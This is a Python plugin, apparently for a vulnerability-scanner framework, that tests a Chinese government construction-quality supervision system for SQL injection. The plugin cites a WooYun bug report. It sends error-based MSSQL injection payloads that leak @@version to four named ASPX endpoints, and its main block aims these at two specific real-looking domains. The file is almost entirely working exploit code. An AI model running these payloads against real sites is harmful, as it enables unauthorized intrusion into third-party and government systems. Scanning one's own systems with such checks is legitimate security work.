#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:政府建设工程质量监督系统3处SQL注入打包(不重复)
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0121058

def assign(service,arg):
    if service=="pkpmbs":
        return True,arg 
    


def  audit(arg):
    url=arg+"pkpmbs/jdmanage/jdprojarchivesmenulist.aspx"
    post="__keyword__=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version ))%20and%20%27%%27=%27"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==500 and  "GAO JI@Microsoft SQL" in res:
            security_hole(url)
    url=arg+"pkpmbs/manager/userfolderlist.aspx"
    post="username=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&cxbtn=%E6%9F%A5%E6%89%BE"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==500 and  "GAOJIMicrosoft" in res:
        security_hole(url)
    url=arg+"INFOBLXX.aspx"
    post="key=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%29%29%20and%20%27%%27=%27&qtype=bljlwh"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==500 and  "GAOJIMicrosoft" in res:
        security_hole(url)
    url=arg+"userService/addresslist.aspx"
    post="keytype=username&keyword=1%27%20and%201=convert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B@@version%20%29%29%20and%20%27%%27=%27&Submit=%B2%E9++%D5%D2"
    code,head,res,errcode,_=curl.curl2(url,post)
    if code==500 and  "GAOJIMicrosoft" in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    
    audit(assign('pkpmbs','http://www.thszjz.com/')[1])
    audit(assign('pkpmbs','http://www.ccjdw.com/')[1])